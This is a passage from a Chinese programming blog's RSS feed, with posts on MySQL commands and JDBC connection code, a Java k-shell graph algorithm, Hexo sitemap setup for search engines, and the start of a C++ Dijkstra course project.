&lt;li>
&lt;p>修改密码&lt;/p>
&lt;pre tabindex="0">&lt;code>ALTER user 'root'@'local' IDENTIFIED BY 'your_password你的密码';
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑:数据库命令大小写其实无所谓，可以都是小写。别忘了末尾的分号&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数据库的基本操作:&lt;/p>
&lt;ul>
&lt;li>新建数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>create database 你要新建的数据库的名字;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>展示所有数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>show databases;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>切换数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>use 你要切换的数据库的名字
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑:这里有没有分号无所谓，其他数据库语句必须分号结尾&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>新建表&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>create table 表名(key1 key_type,key2 key_type,key3 key_type);
实例：
create table student(no VARCHAR(20,name VARCHAR(20),math INT,average DOUBLE);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>展示表中所有数据：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>select * from 表名;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>打印表内数据格式：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>desc 表名;
&lt;/code>&lt;/pre>&lt;p>&lt;a class="link" href="http://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener"
>更多命令&lt;/a>&lt;/p>
&lt;p>&lt;strong>坑:&lt;a class="link" href="https://www.shadowwu.club/2018/05/14/mysql_data_type/index.html" target="_blank" rel="noopener"
>数值类型详解&lt;/a>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>坑:请先切换到你要创建表的数据库再执行创建表明操作&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="java连接数据库">java连接数据库&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>在mysql官网下载mysql connector的java sdk.请按照你的数据库版本下载对应的connector &lt;a class="link" href="https://dev.mysql.com/downloads/connector/j/" target="_blank" rel="noopener"
>下载地址&lt;/a>&lt;/p>
&lt;p>“Select Operating System”选项请选择“Platform Independent”.&lt;/p>
&lt;p>下载第一个还是第二个只是压缩包格式的不同&lt;/p>
&lt;p>下载点击进去之后请点击“No thanks, just start my download.”开始下载&lt;/p>
&lt;/li>
&lt;li>
&lt;p>下载完成之后解压，打开解压后的文件夹，找到一个*.jar后缀的文件列如：&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql-connector-java-8.0.13.jar
&lt;/code>&lt;/pre>&lt;p>将该文件复制到你的eclipse中的java项目里&lt;/p>
&lt;p>&lt;strong>坑:什么你不知道你的eclipse项目目录在哪里？？？默认就在c:\用户\你的用户名\eclise-workplace里，对，打开哪个文件夹，找到你写的那个项目的名字，把这个jar文件放进去！！！&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>将jar文件加入你的java项目&lt;/p>
&lt;p>在eclipse里右键你写的项目，选择new-&amp;gt;选择Sourse Folder，随便起个名字你开心就好-&amp;gt;把你的那个jar文件再放进去（别问我怎么放，打开你的电脑）
&lt;a class="link" href="https://jingyan.baidu.com/article/ca41422fc76c4a1eae99ed9f.html" target="_blank" rel="noopener"
>百度知道图解（百度知道没有选择创建source folder文件夹，我建议你这里选择这个）&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>书本范例代码的问题&lt;/p>
&lt;ul>
&lt;li>新版的mysql数据库connector驱动包全名：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>com.mysql.cj.jdbc.Driver
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>数据库连接url格式：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>jdbc:mysql://localhost:3306/数据库名称?serverTimezone=UTC
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>坑:mysql8.0.x新版在java调用时要增加参数化serverTimezone=UTC，设置数据库时间为世界标准时间，否则会报以下错误&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code> Caused by: java.sql.SQLException: The server time zone value '�й���׼ʱ��' is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support.
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>连接数据库出现access deny字样&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>DriverManger.getConnection(DB_URL,USER,PASS)
&lt;/code>&lt;/pre>&lt;p>DB_URL就是上面提到的url格式内容。&lt;/p>
&lt;p>USER默认&amp;quot;root&amp;quot;,PASS如果为空则使用空字符串即可，有密码请确保密码正确&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="数据库连接代码示例">数据库连接代码示例&lt;/h2>
&lt;h3 id="请确保已经将mysqlconnector加入项目构建目录参照将jar文件加入你的java项目将jar文件加入你的java项目">请确保已经将mysqlconnector加入项目构建目录，参照&lt;a class="link" href="#%e5%b0%86jar%e6%96%87%e4%bb%b6%e5%8a%a0%e5%85%a5%e4%bd%a0%e7%9a%84java%e9%a1%b9%e7%9b%ae" >将jar文件加入你的java项目&lt;/a>&lt;/h3>
&lt;pre tabindex="0">&lt;code>public class MySQLDemo {
// JDBC 驱动名及数据库 URL
static final String JDBC_DRIVER = &amp;quot;com.mysql.cj.jdbc.Driver&amp;quot;;
static final String DB_URL = &amp;quot;jdbc:mysql://localhost:3306/RUNOOB&amp;quot;;//RUNOOB为数据库（database）名称
// 数据库的用户名与密码，需要根据自己的设置
static final String USER = &amp;quot;root&amp;quot;;
static final String PASS = &amp;quot;123456&amp;quot;;
public static void main(String[] args) {
Connection conn = null;
Statement stmt = null;
try{
// 注册 JDBC 驱动
Class.forName(&amp;quot;com.mysql.cj.jdbc.Driver&amp;quot;);
// 打开链接
System.out.println(&amp;quot;连接数据库...&amp;quot;);
conn = DriverManager.getConnection(DB_URL,USER,PASS);
// 执行查询
System.out.println(&amp;quot; 实例化Statement对象...&amp;quot;);
stmt = conn.createStatement();
String sql;
sql = &amp;quot;SELECT id, name, url FROM websites&amp;quot;;//构建sql语句 id name url均为字段名 websites表名
ResultSet rs = stmt.executeQuery(sql);//执行sql语句并获取返回结果
// 展开结果集数据库
while(rs.next()){
// 通过字段检索
int id = rs.getInt(&amp;quot;id&amp;quot;);
String name = rs.getString(&amp;quot;name&amp;quot;);
String url = rs.getString(&amp;quot;url&amp;quot;);
// 输出数据
System.out.print(&amp;quot;ID: &amp;quot; + id);
System.out.print(&amp;quot;, 站点名称: &amp;quot; + name);
System.out.print(&amp;quot;, 站点 URL: &amp;quot; + url);
System.out.print(&amp;quot;\n&amp;quot;);
}
// 完成后关闭
rs.close();
stmt.close();
conn.close();
}catch(SQLException se){
// 处理 JDBC 错误
se.printStackTrace();
}catch(Exception e){
// 处理 Class.forName 错误
e.printStackTrace();
}finally{
// 关闭资源
try{
if(stmt!=null) stmt.close();
}catch(SQLException se2){
}// 什么都不做
try{
if(conn!=null) conn.close();
}catch(SQLException se){
se.printStackTrace();
}
}
System.out.println(&amp;quot;Goodbye!&amp;quot;);
}
}
&lt;/code>&lt;/pre></description></item><item><title>k-shell算法Java实现</title><link>https://blog.yuukisama.cc/p/k-shell%E7%AE%97%E6%B3%95java%E5%AE%9E%E7%8E%B0/</link><pubDate>Fri, 28 Dec 2018 15:06:28 +0000</pubDate><guid>https://blog.yuukisama.cc/p/k-shell%E7%AE%97%E6%B3%95java%E5%AE%9E%E7%8E%B0/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>本文章是基于个人对k-shell算法的理解，若有偏颇还望指正。&lt;/li>
&lt;li>基于java实现的k-shell算法，文末附源码，仅供学习。&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/xiaoling.jpg" >
&lt;img src="https://blog.yuukisama.cc/xiaoling.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="k-shell算法">k-shell算法&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>从数据结构图中逐步删除节点权值小于某阈值的节点以及其相关路径的算法&lt;/p>
&lt;/li>
&lt;li>
&lt;p>K-shell 方法递归地剥离网络中度数小于或等于 k 的节点,具体划分过程如下: 假设网络中不存在度数为 0 的孤立节点。从度指标的角度分析,度数为 1的节点是网络中最不重要的节点,因此首先将度数为 1 的节点及其连边从网络中删除。删除操作进行之后的网络中会出现新的度数为 1 的节点,接着将这些新出现的度数为 1 的节点及其连边删除。重复上述操作,直到网络中不再新出现度数为 1的节点为止。此时所有被删除的节点构成第一层,即 1-shell,节点的 Ks 值等于 1。剩下的网络中,每个节点的度数至少为2。继续重复上述删除操作,得到 Ks 值等于 2 的第二层,即 2-shell。依此类推,直到网络中所有的节点都被赋予 Ks 值。
&lt;a class="link" href="https://blog.csdn.net/DreamHome_S/article/details/78830943" target="_blank" rel="noopener"
>出处&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>关于k-shell算法的一些小问题，目前为止本人未能找到足够官方的文章讲解。若有人能指正，感激不尽。&lt;/p>
&lt;p>节点的度在图的定义中可以理解为节点与其他节点的路径数目。在我们删除对应度数节点的过程中势必会又节点度数更大的节点变为度数小的节点。这样节点的度数就会改变，对于这种改变发生而产生的低于当前处理度数k的新节点又应该怎样处理？&lt;/p>
&lt;p>本代码对这类节点，这个代码处理时在删除当前所有节点度数小于等于ks值的节点，并把删除节点加入ks值。针对此次提供的数据ks层数最大值为12。实验数据以及实验结果将会附在源代码末尾&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="数据结构安排">数据结构安排&lt;/h2>
&lt;p>&lt;strong>以下代码使用vscode+java环境编写&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>因为是使用的java语言。这里用一个hashmap来存储图。hashmap中key，value分别为string，以及hashset。
key值中存储图节点，对应value（hashset型）存储与该节点有连接的节点。&lt;/p>
&lt;pre tabindex="0">&lt;code>HashMap&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; map=new HashMap&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;();
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>用另一个hashmap来存储对应k值的网络层,key值用来存放k值，value的hashset里面存放从网络中剔除的节点。&lt;/p>
&lt;pre tabindex="0">&lt;code>HashMap&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; kmap=new HashMap&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;();
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>首先第一步从文件中读取数据,这里操作时按行读取。&lt;a class="link" href="https://blog.csdn.net/brushli/article/details/12356695" target="_blank" rel="noopener"
>java文件操作&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void loadfile(String filename){
map.clear(); //将图清空重置
try {
File f=new File(filename); //尝试打开文件
FileInputStream fstream=new FileInputStream(f);
InputStreamReader ireader=new InputStreamReader(fstream);
BufferedReader breader=new BufferedReader(ireader);
String line=&amp;quot;&amp;quot;; //存储每一行的数据
String a=&amp;quot;&amp;quot;; //存储逗号左边
String b=&amp;quot;&amp;quot;; //存储逗号右边
String[] points;//存储行数据分割之后的内容
HashSet&amp;lt;String&amp;gt; temp=null;
while ((line=breader.readLine())!=null){
points=line.split(&amp;quot;,&amp;quot;); //以逗号分割字符串
a=points[0];
b=points[1];
temp=map.get(a);
if (temp!=null){ //这里的读取操作有点绕
temp.add(b); //将逗号前面的节点当作key值在map中检索，如果存在对应的value
} //就把逗号后面的节点存入这个key值所对应的value中
else{ //如果不存在，证明map中还没有这个节点的信息。
temp=new HashSet&amp;lt;String&amp;gt;();
temp.add(b); //则将逗号前面的节点作为key
map.put(a, temp); //逗号后面的节点作为value中的元素存入map中
}
temp=map.get(b); //这里将逗号前后对换位置重复一遍，保证map的key值中包含所有的节点
if (temp!=null){
temp.add(a);
}
else{
temp=new HashSet&amp;lt;String&amp;gt;();
temp.add(a);
map.put(b, temp);
}
}
breader.close();
} catch (Exception e) {
//TODO: handle exception
e.printStackTrace();
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>为了方便查看图的变化这里写了一个map的打印函数：&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void mapprint(){
Iterator iter=map.entrySet().iterator();
while (iter.hasNext()){
Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
System.out.println(entry.getKey()+&amp;quot; &amp;quot;+entry.getValue().toString());
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>以及存储对应k值剥离出来的网络节点的打印函数&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void printkmap(){
Iterator iter=kmap.entrySet().iterator();
while(iter.hasNext()){
Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
System.out.println(entry.getKey().toString()+&amp;quot; &amp;quot;+entry.getValue().toString());
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>k-shell算法。&lt;/p>
&lt;ul>
&lt;li>以图（hashmap为空为终止条件）为空为终止条件的循环。每次删除节点权值小于k的节点以及相应路径，在图（hashmap）一轮遍历完成之后k值+1。&lt;/li>
&lt;li>删除的时候要注意，这样的存储结构的设计模式，我们删除一个节点时，要同时把该节点从其他与该节点相连接的节点的value中删除。因此这里的删除函数显得很复杂。&lt;/li>
&lt;/ul>
&lt;p>&lt;a class="link" href="https://www.cnblogs.com/zhangnf/p/HashMap.html" target="_blank" rel="noopener"
>Hashmap的遍历删除操作&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void kshell_func(){
int k=1;
kmap.clear();
while (!map.isEmpty()){
HashSet&amp;lt;String&amp;gt; ktemp=new HashSet&amp;lt;String&amp;gt;();
for (Iterator&amp;lt;Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;&amp;gt; iter = map.entrySet().iterator(); iter.hasNext();){
Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; item = iter.next();
if (item.getValue().size()&amp;lt;=k){
ktemp.add(item.getKey())
for (String i:item.getValue()){
HashSet&amp;lt;String&amp;gt; temp=map.get(i);
temp.remove(item.getKey());
}
iter.remove();
}
}
// Iterator iter=map.entrySet().iterator();
// Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
// while (iter.hasNext()){
// if (entry.getValue().size()&amp;lt;=k){
// ktemp.add(entry.getKey());
// for (String index:entry.getValue()){
// HashSet&amp;lt;String&amp;gt; temp=map.get(index);
// temp.remove(entry.getKey());
// }
// String keytemp=entry.getKey();
// entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
// map.remove(keytemp);
// System.out.println(&amp;quot;delete ...&amp;quot;);
// }
// }
kmap.put(Integer.valueOf(k),ktemp);
k=k+1;
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="源码">源码&lt;/h2>
&lt;p>&lt;a class="link" href="data.txt" >数据文件&lt;/a>&lt;/p>
&lt;p>&lt;a class="link" href="result.txt" >结果文件&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Map;
import java.lang.Integer;
public class kshell{
private static HashMap&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; map=new HashMap&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;();
private static HashMap&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; kmap=new HashMap&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;();
private static void loadfile(String filename){
map.clear();
try {
File f=new File(filename);
FileInputStream fstream=new FileInputStream(f);
InputStreamReader ireader=new InputStreamReader(fstream);
BufferedReader breader=new BufferedReader(ireader);
String line=&amp;quot;&amp;quot;;
String a=&amp;quot;&amp;quot;;
String b=&amp;quot;&amp;quot;;
String[] points;
HashSet&amp;lt;String&amp;gt; temp=null;
while ((line=breader.readLine())!=null){
points=line.split(&amp;quot;,&amp;quot;);
a=points[0];
b=points[1];
temp=map.get(a);
if (temp!=null){
temp.add(b);
}
else{
temp=new HashSet&amp;lt;String&amp;gt;();
temp.add(b);
map.put(a, temp);
}
temp=map.get(b);
if (temp!=null){
temp.add(a);
}
else{
temp=new HashSet&amp;lt;String&amp;gt;();
temp.add(a);
map.put(b, temp);
}
}
breader.close();
} catch (Exception e) {
//TODO: handle exception
e.printStackTrace();
}
}
private static void mapprint(){
Iterator iter=map.entrySet().iterator();
while (iter.hasNext()){
Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
System.out.println(entry.getKey()+&amp;quot; &amp;quot;+entry.getValue().toString());
}
}
private static void kshell_func(){
int k=1;
kmap.clear();
while (!map.isEmpty()){
HashSet&amp;lt;String&amp;gt; ktemp=new HashSet&amp;lt;String&amp;gt;();
for (Iterator&amp;lt;Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;&amp;gt; iter = map.entrySet().iterator(); iter.hasNext();){
Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; item = iter.next();
if (item.getValue().size()&amp;lt;=k){
ktemp.add(item.getKey())
for (String i:item.getValue()){
HashSet&amp;lt;String&amp;gt; temp=map.get(i);
temp.remove(item.getKey());
}
iter.remove();
}
}
// Iterator iter=map.entrySet().iterator();
// Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
// while (iter.hasNext()){
// if (entry.getValue().size()&amp;lt;=k){
// ktemp.add(entry.getKey());
// for (String index:entry.getValue()){
// HashSet&amp;lt;String&amp;gt; temp=map.get(index);
// temp.remove(entry.getKey());
// }
// String keytemp=entry.getKey();
// entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
// map.remove(keytemp);
// System.out.println(&amp;quot;delete ...&amp;quot;);
// }
// }
kmap.put(Integer.valueOf(k),ktemp);
k=k+1;
}
}
private static void printkmap(){
Iterator iter=kmap.entrySet().iterator();
while(iter.hasNext()){
Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
System.out.println(entry.getKey().toString()+&amp;quot; &amp;quot;+entry.getValue().toString());
}
}
public static void main(String[] args) {
loadfile(&amp;quot;./data.txt&amp;quot;);
//mapprint();
kshell_func();
//mapprint();
printkmap();
System.out.println(&amp;quot;complete&amp;quot;);
}
}
&lt;/code>&lt;/pre></description></item><item><title>小站成长日记-搜索引擎可发现</title><link>https://blog.yuukisama.cc/p/%E5%B0%8F%E7%AB%99%E6%88%90%E9%95%BF%E6%97%A5%E8%AE%B0-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%AF%E5%8F%91%E7%8E%B0/</link><pubDate>Thu, 27 Dec 2018 23:53:12 +0000</pubDate><guid>https://blog.yuukisama.cc/p/%E5%B0%8F%E7%AB%99%E6%88%90%E9%95%BF%E6%97%A5%E8%AE%B0-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%AF%E5%8F%91%E7%8E%B0/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>本文介绍了如何让搜索引擎可以搜索本站，小站成长的一步~&lt;/li>
&lt;li>搜索引擎检索至少需要你的网站有域名（不建议没有域名）因此国内就需要进行备案等等一系列的操作，如果尚未备案的可以完成备案之后再尝试。&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/baidu.jpg" >
&lt;img src="https://blog.yuukisama.cc/baidu.jpg"
loading="lazy"
alt="谷歌娘">
&lt;/a>
&lt;figcaption>谷歌娘&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="建立站点地图">建立站点地图&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>在本地博客文件夹路径内运行代码如下，安装站点地图生成插件:&lt;/p>
&lt;pre tabindex="0">&lt;code>npm install hexo-generator-sitemap --save
npm install hexo-generator-baidu-sitemap --save
&lt;/code>&lt;/pre>&lt;p>分别安装hexo站点地图生成插件，对应的分别是百度的站点地图生成以及Google粑粑的站点地图。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>构建网站，检查在public文件夹中是否产生sitemap.xml，baidusitemap.xml。存在表明站地图生成成功。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在source文件夹下新建robots.txt文件 &lt;a class="link" href="https://baike.baidu.com/item/robot.txt" target="_blank" rel="noopener"
>什么是robots.txt&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>User-agent: *
Sitemap: http://aleonchen.com/sitemap.xml
Sitemap: http://aleonchen.com/baidusitemap.xml
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>重新构架并发布你的网站&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo g -d
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="向搜索引擎注册你的网站">向搜索引擎注册你的网站&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>备注：这里使用html的认证方法&lt;/p>
&lt;p>&lt;a class="link" href="https://www.google.com/webmasters/tools/home?hl=zh-CN" target="_blank" rel="noopener"
>Google 提交入口&lt;/a>&lt;/p>
&lt;p>&lt;a class="link" href="https://ziyuan.baidu.com/linksubmit/url" target="_blank" rel="noopener"
>百度提交入口&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>下载搜索引擎提供的html文件&lt;/li>
&lt;li>添加到博客下的source文件夹内&lt;/li>
&lt;li>构建发布之后在搜索引擎提交入口完成认证,等待搜索引擎完成数据更新之后即可在搜索引擎中找到你的站点。&lt;/li>
&lt;/ol>
&lt;h2 id="坑">&lt;strong>坑：&lt;/strong>&lt;/h2>
&lt;p>直接这样加入source里构建并发布会会导致在访问这个html文件的时候被hexo本身重定向。如果你出现了重定向问题，请参照如下方式:&lt;/p>
&lt;p>在source文件夹下搜索引擎提供的html首部加入:&lt;/p>
&lt;pre tabindex="0">&lt;code>layout: false
---
&lt;/code>&lt;/pre>&lt;p>这样可以标识hexo停用ta的渲染，就不会重定向了.&lt;/p>
&lt;p>之后重新构建发布网站即可&lt;/p></description></item><item><title>Dijkstra算法课设</title><link>https://blog.yuukisama.cc/p/dijkstra%E7%AE%97%E6%B3%95%E8%AF%BE%E8%AE%BE/</link><pubDate>Thu, 27 Dec 2018 18:35:23 +0000</pubDate><guid>https://blog.yuukisama.cc/p/dijkstra%E7%AE%97%E6%B3%95%E8%AF%BE%E8%AE%BE/</guid><description>&lt;blockquote>
&lt;h2 id="dijkstra算法课设">Dijkstra算法课设&lt;/h2>
&lt;/blockquote>
&lt;p>数据结构课程中的经典算法。我会将一些程序系统设计过程中的一些小细节问题（暂且称之为小细节把，因为我也不知道拿什么次比较准确），并在最后附上程序所有源码。作为一个曾经的苟若的算法狗（现在依旧小垃圾）,很多数据结构在实现的时候没必要照抄《数据结构》书上那套迂腐的东西，那终究是伪代码，而且反人类&lt;del>当然如果你就是十分喜欢结构体的使用的话不拦着你&lt;/del>。&lt;/p>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/miao.jpg" >
&lt;img src="https://blog.yuukisama.cc/miao.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;strong>很多东西是编程的一些编程习惯，多敲，多理解，遇到bug不要第一件事情是想着找别人问。程序员需要的是自己解决问题的能力（当然也不是一味的钻牛角尖，这就是中庸的事情了）&lt;/strong>
&lt;del>我的某个好友问我你看到程序报错的第一反应是什么，ta的回答是问老师，我是真的无话可讲了&lt;/del>&lt;/p>
&lt;h2 id="以下代码基于c">&lt;strong>以下代码基于c++&lt;/strong>&lt;/h2>
&lt;h2 id="课设要求">课设要求&lt;/h2>
&lt;ol>
&lt;li>结点数可改变(可增加或删除城市及相关弧)&lt;/li>
&lt;li>弧的权值可改变(输入有弧的两个城市名称，修改相应权值)&lt;/li>
&lt;li>源点固定，输入不同终点时，能输出最短路径长度及路径(以城市名称表示)&lt;/li>
&lt;li>初始图至少包括6个城市&lt;/li>
&lt;li>设计简单菜单能进行操作选择&lt;/li>
&lt;/ol>
&lt;h2 id="数据结构的选用">数据结构的选用&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>存储图的数据结构书上讲解了三种，这里选择的是使用实现起来最简单的邻接矩阵。&lt;/p>
&lt;pre tabindex="0">&lt;code>#defin MAXSIZE 256
int map[MAXSIZE][MAXSIZE];
&lt;/code>&lt;/pre>&lt;p>当然你也可以选择使用邻接表，那就是挑战自己的事情。邻接表的好处是在图边数较为少的时候可以用更少的存储空间,但是邻接矩阵在访问速度，效率上高很多（所谓空间换时间233）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>邻接矩阵的初始化。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>因为假定城市之间是无向图，那么邻接矩阵应该是呈现出以对角线对称的趋势(因为map&lt;input checked="" disabled="" type="checkbox"> [y]的值等于map[y]&lt;input checked="" disabled="" type="checkbox"> 因为我们这里认为这两个是一个路径，一个弧边)。我们把城市x到城市x自己的权值赋值为0，把城市x到城市y有路径的城市赋值为对应权值。城市间没有路径的话我们赋值权值为一个最大值0x7FFFFFFF,这又便于我们下面的Dijkstra算法进行&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当然为了打印邻接矩阵看着漂亮，在打印邻接矩阵的时候使用-代替了0x7FFFFFFF数据&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/sample.jpg" >
&lt;img src="https://blog.yuukisama.cc/sample.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>还需要一个String数组来存储我们可能包含中文的城市名，数组的下标就对应邻接矩阵中的下标。&lt;/p>
&lt;pre tabindex="0">&lt;code>String Citylist[MAXSIZE];
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>因为采用了邻接矩阵存储图，那么删除城市节点的时候只需要删除对应的邻接矩阵中的行和列,以及存储城市名称数组中的对应位置，增加城市节点以及修改城市节点同理，都是通过遍历城市名称遍历得到城市编号，借由编号访问位于邻接矩阵中城市之间的权值：&lt;/p>
&lt;/li>
&lt;li>
&lt;p>以下是删除二维矩阵（邻接矩阵中行和列的操作，以及删除城市名称数组的操作）&lt;/p>
&lt;pre tabindex="0">&lt;code>void Delcol(int x) {
int i,j;
if (x&amp;gt;N or x&amp;lt;1) return;
for (i=1; i&amp;lt;=N; i++) {
for (j=x; j&amp;lt;N; j++)
map[i][j]=map[i][j+1];
map[i][j]=0;
}
}
void Delrow(int x) {
int i;
if (x&amp;gt;N or x&amp;lt;1) return;
for (i=x; i&amp;lt;N; i++)
memcpy(map[i],map[i+1],sizeof(int)*(N));
memset(map[i],0,N-1);
}
void Delname(int x) {
int i;
for (i=x; i&amp;lt;N; i++) CityList[i]=CityList[i+1];
CityList[i]= {0};
}
void Mapdel() {
int x;
cout&amp;lt;&amp;lt;&amp;quot;请输入您要删除的城市编号:&amp;quot;;
cin&amp;gt;&amp;gt;x;
Delname(x);
Delcol(x);
Delrow(x);
N--;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>关于Dijkstra算法的详解&lt;/p>
&lt;ul>
&lt;li>首先还是从数据存储结构的设计入手。我们需要一个一维bool数组存储每个节点是否被访问过。并在寻路算法开始的时候初始化其内瓤&lt;/li>
&lt;li>其次，我们需要一个一维数组来存储从出发点到每个节点的路径长度&lt;/li>
&lt;li>最后，创建一个String数组来存储我们的路径&lt;/li>
&lt;li>关于Dijkstra算法理论的详解，我不是一个好老师，讲不清楚，就鸽了吧。当然数据结构的设计首先得理解算法思路。&lt;a class="link" href="https://blog.csdn.net/qq_35644234/article/details/60870719" target="_blank" rel="noopener"
>Dijkstra算法详解(这个详解还是不错的，已经从很多提问里看出来这个博客的影子了)&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="源码实现">源码实现&lt;/h2>
&lt;h3 id="仅供学习">&lt;strong>仅供学习&lt;/strong>&lt;/h3>
&lt;p>代码里为了完成课设某个要求智障的初始化函数还请无视(☆-ｖ-)&lt;/p>
&lt;p>代码可能有很多智障的bug，毕竟也是写个课设交完报告就完事的，若有高见，还望指正。谢谢(●ˇ∀ˇ●)&lt;/p>
